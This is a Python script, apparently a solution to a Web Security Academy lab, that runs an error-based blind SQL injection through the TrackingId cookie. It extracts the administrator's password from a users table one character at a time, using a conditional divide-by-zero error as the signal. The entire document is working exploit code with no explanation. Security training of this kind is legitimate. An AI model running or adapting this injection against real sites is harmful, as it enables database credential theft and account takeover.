import requests

url = 'https://ac121fe31eae5b14c0c509ee009b008f.web-security-academy.net/'
trackingId = 'iy6lnh3AlTx4XaDq'

pass_len = 20
admin_pass = ''

while len(admin_pass) < pass_len:
    char = '0'
    valid = False
    while char <= 'z':
        payload = f"{trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, {len(admin_pass)+1}, 1) = '{char}') THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
        resp = requests.get(url=url, cookies={'TrackingId': payload})

        if 'Internal Server Error' in resp.text:
            valid = True
            break

        if char == '9':
            char = 'a'
        else:
            char = chr(ord(char) + 1)

    if not valid:
        print('Failed to find character')
        break
        
    admin_pass += char
    print(f"Found {char}")

print(admin_pass)
